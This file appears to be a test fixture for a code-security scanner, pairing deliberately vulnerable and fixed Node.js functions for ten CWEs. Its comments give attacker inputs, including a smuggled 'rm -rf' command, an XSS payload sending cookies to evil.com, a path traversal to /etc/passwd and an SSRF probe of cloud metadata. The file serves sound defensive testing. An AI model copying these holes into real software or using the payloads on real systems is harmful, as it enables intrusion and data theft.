// ══════════════════════════════════════════════════════════════════
// SIFT TEST CASES — Vulnerable / Safe Code Pairs
// Each pair tests one CWE. Feed the VULNERABLE version to
// analyze_code() and both versions to analyze_fixed_code().
// Expected: SIFT detects vuln in vulnerable, confirms fix in safe.
// ══════════════════════════════════════════════════════════════════


// ─────────────────────────────────────────────────────────────────
// TEST 1 — CWE-078: OS Command Injection (JavaScript / Node.js)
// Expected SIFT score: VULNERABLE < 50 | FIXED > 70
// ─────────────────────────────────────────────────────────────────

// ❌ VULNERABLE
const { exec } = require('child_process');
function pingHost_VULNERABLE(hostname) {
    // User input directly concatenated into shell command
    exec('ping -c 1 ' + hostname, (err, stdout) => {
        console.log(stdout);
    });
}
// Attacker input: "google.com; rm -rf /tmp/important"
// Result: executes rm -rf as part of the shell command

// ✅ SAFE
const { execFile } = require('child_process');
function pingHost_SAFE(hostname) {
    // execFile does not invoke a shell — arguments are passed directly
    // Input is also validated against a safe pattern first
    if (!/^[a-zA-Z0-9.\-]+$/.test(hostname)) {
        throw new Error('Invalid hostname');
    }
    execFile('ping', ['-c', '1', hostname], (err, stdout) => {
        console.log(stdout);
    });
}


// ─────────────────────────────────────────────────────────────────
// TEST 2 — CWE-089: SQL Injection (JavaScript / Node.js + MySQL)
// Expected SIFT score: VULNERABLE < 50 | FIXED > 70
// ─────────────────────────────────────────────────────────────────

// ❌ VULNERABLE
function getUserByUsername_VULNERABLE(db, username, callback) {
    // String interpolation builds SQL query from untrusted input
    const query = "SELECT * FROM users WHERE username = '" + username + "'";
    db.query(query, callback);
}
// Attacker input: "' OR '1'='1" dumps entire users table

// ✅ SAFE
function getUserByUsername_SAFE(db, username, callback) {
    // Parameterised query — input is never interpreted as SQL
    const query = "SELECT * FROM users WHERE username = ?";
    db.query(query, [username], callback);
}


// ─────────────────────────────────────────────────────────────────
// TEST 3 — CWE-022: Path Traversal (JavaScript / Node.js)
// Expected SIFT score: VULNERABLE < 50 | FIXED > 70
// ─────────────────────────────────────────────────────────────────

const fs = require('fs');
const path = require('path');

// ❌ VULNERABLE
function readFile_VULNERABLE(req, res) {
    const filename = req.query.file;
    // No sanitisation — attacker can read any file on the system
    const filePath = '/var/www/uploads/' + filename;
    res.send(fs.readFileSync(filePath));
}
// Attacker input: "../../etc/passwd"

// ✅ SAFE
function readFile_SAFE(req, res) {
    const BASE_DIR = '/var/www/uploads/';
    const filename = req.query.file;
    // Resolve full path and verify it stays within BASE_DIR
    const resolved = path.resolve(BASE_DIR, filename);
    if (!resolved.startsWith(path.resolve(BASE_DIR))) {
        return res.status(403).send('Access denied');
    }
    res.send(fs.readFileSync(resolved));
}


// ─────────────────────────────────────────────────────────────────
// TEST 4 — CWE-079: Cross-Site Scripting / XSS (JavaScript)
// Expected SIFT score: VULNERABLE < 50 | FIXED > 70
// ─────────────────────────────────────────────────────────────────

// ❌ VULNERABLE
function renderComment_VULNERABLE(comment) {
    // Directly inserts user-supplied content into the DOM
    document.getElementById('comments').innerHTML += '<p>' + comment + '</p>';
}
// Attacker input: "<script>document.location='https://evil.com?c='+document.cookie</script>"

// ✅ SAFE
function renderComment_SAFE(comment) {
    // Creates a text node — browser never interprets content as HTML
    const p = document.createElement('p');
    p.textContent = comment;
    document.getElementById('comments').appendChild(p);
}


// ─────────────────────────────────────────────────────────────────
// TEST 5 — CWE-400: ReDoS / Regular Expression DoS (JavaScript)
// Expected SIFT score: VULNERABLE < 50 | FIXED > 70
// ─────────────────────────────────────────────────────────────────

// ❌ VULNERABLE
function validateEmail_VULNERABLE(email) {
    // Catastrophic backtracking on long non-matching strings
    // Pattern: (a+)+ is the classic ReDoS anti-pattern
    const re = /^([a-zA-Z0-9._%-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6})*$/;
    return re.test(email);
}
// Attacker input: "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!" — causes CPU spin

// ✅ SAFE
function validateEmail_SAFE(email) {
    // Linear-time regex — no nested quantifiers on overlapping groups
    const re = /^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/;
    if (email.length > 254) return false;   // RFC 5321 max length guard
    return re.test(email);
}


// ─────────────────────────────────────────────────────────────────
// TEST 6 — CWE-352: Cross-Site Request Forgery / CSRF (Node.js/Express)
// Expected SIFT score: VULNERABLE < 50 | FIXED > 70
// ─────────────────────────────────────────────────────────────────

const express = require('express');

// ❌ VULNERABLE
const app_VULNERABLE = express();
app_VULNERABLE.use(express.urlencoded({ extended: true }));

app_VULNERABLE.post('/transfer', (req, res) => {
    // No CSRF token check — any site can trigger this on behalf of a user
    const { toAccount, amount } = req.body;
    performTransfer(req.session.userId, toAccount, amount);
    res.send('Transfer complete');
});

// ✅ SAFE
const csrf = require('csurf');
const app_SAFE = express();
app_SAFE.use(express.urlencoded({ extended: true }));
app_SAFE.use(csrf({ cookie: true }));

app_SAFE.post('/transfer', (req, res) => {
    // csurf middleware validates the token before reaching this handler
    const { toAccount, amount } = req.body;
    performTransfer(req.session.userId, toAccount, amount);
    res.send('Transfer complete');
});


// ─────────────────────────────────────────────────────────────────
// TEST 7 — CWE-094: Code Injection via eval() (JavaScript)
// Expected SIFT score: VULNERABLE < 50 | FIXED > 70
// ─────────────────────────────────────────────────────────────────

// ❌ VULNERABLE
function calculate_VULNERABLE(expression) {
    // eval() executes arbitrary JavaScript from user input
    return eval(expression);
}
// Attacker input: "process.env" or "require('child_process').execSync('id')"

// ✅ SAFE
function calculate_SAFE(expression) {
    // Whitelist-only: only digits, operators, spaces, parentheses
    if (!/^[0-9+\-*/().\s]+$/.test(expression)) {
        throw new Error('Invalid expression');
    }
    // Use Function constructor in strict scope as a sandboxed evaluator
    // (Or better: use a dedicated math parser library like mathjs)
    return Function('"use strict"; return (' + expression + ')')();
}


// ─────────────────────────────────────────────────────────────────
// TEST 8 — CWE-287: Missing Authentication (Node.js/Express)
// Expected SIFT score: VULNERABLE < 50 | FIXED > 70
// ─────────────────────────────────────────────────────────────────

// ❌ VULNERABLE
app_VULNERABLE.get('/admin/users', (req, res) => {
    // No authentication check — anyone can access the admin route
    db.query('SELECT * FROM users', (err, rows) => {
        res.json(rows);
    });
});

// ✅ SAFE
function requireAuth(req, res, next) {
    if (!req.session || !req.session.userId) {
        return res.status(401).json({ error: 'Unauthorised' });
    }
    next();
}

function requireAdmin(req, res, next) {
    if (req.session.role !== 'admin') {
        return res.status(403).json({ error: 'Forbidden' });
    }
    next();
}

app_SAFE.get('/admin/users', requireAuth, requireAdmin, (req, res) => {
    db.query('SELECT * FROM users', (err, rows) => {
        res.json(rows);
    });
});


// ─────────────────────────────────────────────────────────────────
// TEST 9 — CWE-918: Server-Side Request Forgery / SSRF (Node.js)
// Expected SIFT score: VULNERABLE < 50 | FIXED > 70
// ─────────────────────────────────────────────────────────────────

const https = require('https');
const { URL } = require('url');

// ❌ VULNERABLE
function fetchExternalResource_VULNERABLE(req, res) {
    const targetUrl = req.query.url;
    // No validation — attacker can probe internal services
    https.get(targetUrl, (response) => {
        response.pipe(res);
    });
}
// Attacker input: "http://169.254.169.254/latest/meta-data/" (AWS metadata)

// ✅ SAFE
const ALLOWED_HOSTS = ['api.example.com', 'cdn.example.com'];

function fetchExternalResource_SAFE(req, res) {
    let parsed;
    try {
        parsed = new URL(req.query.url);
    } catch {
        return res.status(400).send('Invalid URL');
    }
    // Only allow HTTPS and explicitly whitelisted hostnames
    if (parsed.protocol !== 'https:' || !ALLOWED_HOSTS.includes(parsed.hostname)) {
        return res.status(403).send('Host not allowed');
    }
    https.get(parsed.toString(), (response) => {
        response.pipe(res);
    });
}


// ─────────────────────────────────────────────────────────────────
// TEST 10 — CWE-862: Missing Authorisation / IDOR (Node.js/Express)
// Expected SIFT score: VULNERABLE < 50 | FIXED > 70
// ─────────────────────────────────────────────────────────────────

// ❌ VULNERABLE
app_VULNERABLE.get('/api/orders/:orderId', requireAuth, (req, res) => {
    const { orderId } = req.params;
    // Fetches order without checking it belongs to the requesting user
    db.query('SELECT * FROM orders WHERE id = ?', [orderId], (err, row) => {
        res.json(row);
    });
});
// Attacker: iterate orderId values to read other users' orders (IDOR)

// ✅ SAFE
app_SAFE.get('/api/orders/:orderId', requireAuth, (req, res) => {
    const { orderId } = req.params;
    const userId = req.session.userId;
    // Ownership check: ensures the order belongs to the authenticated user
    db.query(
        'SELECT * FROM orders WHERE id = ? AND user_id = ?',
        [orderId, userId],
        (err, row) => {
            if (!row) return res.status(404).json({ error: 'Not found' });
            res.json(row);
        }
    );
});
